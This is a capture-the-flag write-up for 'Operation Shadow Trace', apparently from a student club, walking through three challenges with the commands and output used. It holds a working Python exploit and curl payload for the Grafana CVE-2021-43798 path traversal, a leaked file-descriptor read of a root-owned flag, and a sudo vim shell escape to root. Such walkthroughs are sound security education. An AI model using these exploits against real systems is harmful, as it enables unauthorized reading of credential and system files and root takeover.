# Operation-Shadow-Trace
**FLAGS:**

Grafana blog:
```
PClub{Easy LFI}
PClub{4lw4ys_cl05e_y0ur_fil3s}
PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed}
```

Kalpit Rama blog:
```
flag1:PClub{idk_how_this_got_typed}
```
## Grafana Blog
### Initial challenge:
**FLAG:** ```PClub{Easy LFI}```  
 
When reading the grafana blog, opened the link to the grafana login dashboard. We didn't have the login id and password.  
 
When searched for grafana and its vulnerability found about the ```Grafana 8.3.0 - Directory Traversal and Arbitrary File Read, CVE:2021-43798```.  
There existed vulnerability that local files can be directly transversed.  

The detail of the exploit is found in this link: 
https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p  

Used this on terminal and found the flag in return, and the next IP and port of next two challenges.
```
curl http://13.126.50.182:3000/public/plugins/tempo/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag 
```
Returned data: 
```
PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

Also I saw a direct transversal code when going through google, link:  
https://www.exploit-db.com/exploits/50581  
To cross check all the other plugins, I ran it with necessary changes and got the same output on other plugins too.
```
#!/usr/bin/env python3
import requests
import random
import urllib3
urllib3.disable_warnings()
PLUGIN_LIST = [ "alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", "dashlist", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "graph", "heatmap", "histogram", "influxdb", "jaeger", "logs", "loki", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus", "stackdriver", "stat", "state-timeline", "status-history", "table", "table-old", "tempo", "testdata", "text", "timeseries", "welcome", "zipkin" ]
TARGET = "http://13.126.50.182:3000"
SESSION = requests.Session()
HEADERS = { 'User-Agent': 'Mozilla/5.0' }
# Encoded traversal (12 levels deep)
TRAVERSAL = "%2E%2E%2F" * 12 # = ../../../../... (12 times)
def attempt_read(filepath):
   plugin = random.choice(PLUGIN_LIST)
   filepath_encoded =filepath.replace("/", "%2F")
   url = f"{TARGET}/public/plugins/{plugin}/{TRAVERSAL}{filepath_encoded}"
    print(f"🔎 Trying: {url}")
    try:
        res = SESSION.get(url, headers=HEADERS, verify=False, timeout=5)
        if res.status_code == 200 and "PClub{" in res.text:
            print(f"\n✅ FLAG FOUND at: {url}")
            print(res.text)
        elif res.status_code == 200:
            print(f"[+] File accessible — plugin '{plugin}' responded:")
            print(res.text[:300] + ("..." if len(res.text) > 300 else ""))
        elif "Found" in res.text and "/login" in res.text:
            print("🚫 Redirected to login. File may exist, but access is blocked.")
        else:
            print("[-] File not found or not readable.")
    except requests.exceptions.RequestException as e:         print(f"[!] Error accessing {url}: {e}")
def main():
    print("🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace")
    print(f"🌐 Targeting: {TARGET}")
    print("📂 Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ\n")
    try:
        while True:
            filepath = input("📥 File to read: ").strip()
            if not filepath.startswith("/"):
                filepath = "/" + filepath
            attempt_read(filepath)
    except KeyboardInterrupt:
        print("\n👋 Exiting...")
if __name__ == "__main__":
    main()

... 
🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace 🌐
Targeting: http://13.126.50.182:3000 📂
Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ
📥 File to read: /tmp/flag
🔎Trying: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
🔎 Trying: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
📥 File to read: /tmp/flag
🔎 Trying: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

### Challenge 2

*challenge* - 13.235.21.137:4657  

**FLAG**:```PClub{4lw4ys_cl05e_y0ur_fil3s}``` 

Connected to terminal using:
```nc 13.235.21.137 4657```

ls Gives: 
```
$ ls 
file_chal file_chal.c
``` 

Used cat to see the c script
```
$ cat file_chal.c

#include <fcntl.h>
#include <unistd.h>
int main () {
    int fd = open ("/root/flag", 0);
// Dropping root previliges
// definitely not forgetting anything
    setuid (getuid ());
    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0; }
``` 

We see that the code opens the flag before dropping the root privilage. The file is opened but not closed. So the file descriptor pointing to ```/root/flag``` is still valid.

Then to see the file descriptors used:
``` 
ls -l /proc/$$/fd

total 0 lrwx------ 1 ctf ctf 64 May 23 09:35 0 -> /dev/pts/24
lrwx------ 1 ctf ctf 64 May 23 09:35 1 -> /dev/pts/24
lrwx------ 1 ctf ctf 64 May 23 09:35 2 -> /dev/pts/24
lr-x------ 1 ctf ctf 64 May 23 09:35 3 -> /root/flag
```
Then tried to cat fd 3:
```
$ $ cat /proc/$$/fd/3
cat: /proc/2285/fd/3: Permission denied
```
We can't cat it directly. 
But we are already in the same process that opened fd3, so tried shell redirection: Which gives us the flag.
```
$ read line <&3
echo "$line"
$ PClub{4lw4ys_cl05e_y0ur_fil3s}
```




### Challenge 3

Challenge - ```13.235.21.137:4729``` 

**FLAG:** ```PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} ```

First comnect with netcat:
``` nc 13.235.21.137 4729``` 

It gave:
```
/bin/sh: 0: can't access tty; job control turned off 
```
Did:
```
$ whoami
ctf
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```
So I'm a low privilage user.  
Then to see the file system , did:
```
$ ls 
$ cd .. 
$ ls
bin chal etc lib media opt root sbin sys usr boot dev home lib64 mnt proc run srv tmp var 
``` 

Then tried to list the important directories i saw:
```
$ ls /chal
ls /home 
ls /root
$ ubuntu 
$ ls: cannot open directory '/root':Permission denied 
```
So root can't be accessed.
Then tried to read common challenge locations:
```
$cat /chal/* 
cat /home/*/* 

$ cat: '/chal/*': No such file or directory 
$ cat: '/home/*/*': No such file or directory
``` 

To find any file with "flag" in its name, used:```find / -name '*flag*' 2>/dev/null```
```
$ find / -name '*flag*' 2>/dev/null 
/proc/sys/kernel/acpi_video_flags 
/proc/sys/net/ipv4/fib_notify_on_flag_change 
/proc/sys/net/ipv6/fib_notify_on_flag_change 
/proc/kpageflags 
/sys/devices/pnp0/00:06/00:06:0/00:06:0.0/tty/ttyS0/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags 
/sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/eth0/flags 
/sys/hypervisor/start_flags 
/sys/module/scsi_mod/parameters/default_dev_flags 
/tmp/recovered_flag.txt 
/tmp/flag.swp 
```
I tried some sudo command but got error that Permission denied so decided to check privilages of sudo:
```
$ sudo -l 
Matching Defaults entries for ctf on 1d6089cf076a: 
        env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty 

User ctf may run the following commands on 1d6089cf076a:
         (ALL) NOPASSWD: /bin/vim 
```
So now as we can use ```sudo/bin/vim``` we can escalate our privilages and get the root access through vim.
Then did:
```
$ sudo /bin/vim -c ':!/bin/sh' 
E558:  Terminal entry not found in terminfo 'unknown' not known. Available builtin terminals are: 

builtin_ansi
builtin_vt320
builtin_vt52
builtin_xterm
builtin_iris-ansi
builtin_pcansi
builtin_win32
builtin_amiga
builtin_dumb
builtin_debug
defaulting to 'ansi' 

```
Vim was opened ,tried to get the root access: 

```
:!/bin/sh 
/bin/sh: 0: can't access tty; job control turned off 
# whoami
root 
# ls /root 
cat /root/* flag
# PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} 
# 
```
Got the flag.
